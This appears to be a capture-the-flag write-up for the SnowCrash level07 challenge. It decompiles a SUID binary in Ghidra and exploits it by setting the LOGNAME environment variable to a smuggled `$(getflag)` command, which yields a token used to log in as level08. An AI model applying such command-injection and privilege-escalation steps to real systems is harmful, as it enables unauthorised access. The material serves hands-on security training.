- The binary `level07` at `/home/user/level07` has SUID set as flag07

```
evel07@SnowCrash:~$ pwd
/home/user/level07
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile

```

- Executing the binary simply outputs `level07` to screen

```
level07@SnowCrash:~$ ./level07 
level07
```

- Ex-filtrate the binary to the attack machine and launch `ghidra` to de-compile the binary and examine the code
```
┌──(kali㉿kali)-[~/Desktop/snowcrash]
└─$ sudo ghidra level07
```

![[Pasted image 20250914040555.png]]

- In the code the variable pcVar1 is obtained from the environment variable `LOGNAME` and passed into the `asprintf` function as a string. This is confirmed by inspecting the `LOGNAME`  environment variable 

```
level07@SnowCrash:~$ env
<snip>
LOGNAME=level07
<snip>
```

- We can amend the environment variable `LOGNAME` to inject a command into the code which will be passed into the `asprintf` function. The `LOGNAME` will be instructed to execute `getflag` command.

```
level07@SnowCrash:~$ export LOGNAME=\$\(getflag\)
level07@SnowCrash:~$ echo $LOGNAME
$(getflag)
```

- Relaunch binary with the new environment variable to obtain the flag

```
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

- Authenticate to `level08` with the token

```
level07@SnowCrash:~$ su level08
Password: 
level08@SnowCrash:~$ 
```
